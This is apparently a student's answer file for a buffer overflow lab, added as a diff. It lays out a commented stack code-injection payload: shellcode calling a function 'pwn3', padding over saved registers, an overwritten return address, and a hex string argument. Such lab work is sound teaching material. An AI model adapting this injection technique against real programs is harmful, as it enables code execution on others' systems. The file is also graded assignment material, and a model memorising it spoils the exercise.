@@ -1,0 +1,22 @@
+Q. Your exploit explanation below.
+Stack code injection attack, call pwn3 with argument in rdi and rsi
+61 00 -- a (text) number and 0 byte for eval_token (still in tok)
+ff ff ff ff ff ff -- padding for tok
+48 c7 c7 65 00 00 00 -- mov rdi, 0x65
+48 be 90 0f e8 ff ff 7f 00 00 -- movabs rsi, 0x7fffffe80f90(address of string)
+48 c7 c0 90 1c 40 00 -- mov rax, 0x401c90
+ff d0 ff ff ff ff ff ff -- call rax
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok 
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for tok
+ff ff ff ff ff ff ff ff -- padding for previous rbx
+ff ff ff ff ff ff ff ff -- padding for previous r12
+ff ff ff ff ff ff ff ff -- padding for previous rbp
+18 0f e8 ff ff 7f 00 00 -- change return address to execute code at address 0x7fffffe80f18
+6c 33 33 74 68 34 78 30 -- string argument in hex
+72 68 33 72 33 00 ff ff -- string argument in hex
+
